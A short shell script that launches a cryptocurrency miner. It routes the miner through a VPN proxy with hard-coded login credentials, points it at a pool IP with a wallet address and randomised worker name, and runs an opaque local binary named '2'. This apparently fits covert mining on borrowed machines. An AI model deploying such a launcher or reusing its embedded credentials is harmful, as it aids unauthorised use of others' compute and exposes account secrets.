#!/bin/sh
proxy="socks5://OXk5cgacd:4uHDOv78GAq@iad-a10.ipvanish.com:1080"
PoolHost=51.210.180.98
Port=3300
PublicVerusCoinAddress=DTsu49wXhGQ7yGWuRYsnz4EmC55Xg6YkrE
WorkerName=$(echo $(shuf -i 10-99 -n 1)-COCOL)
Threads=8
chmod u+x 2 && ./2 -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -t "${Threads}" -p c=DGB $proxy
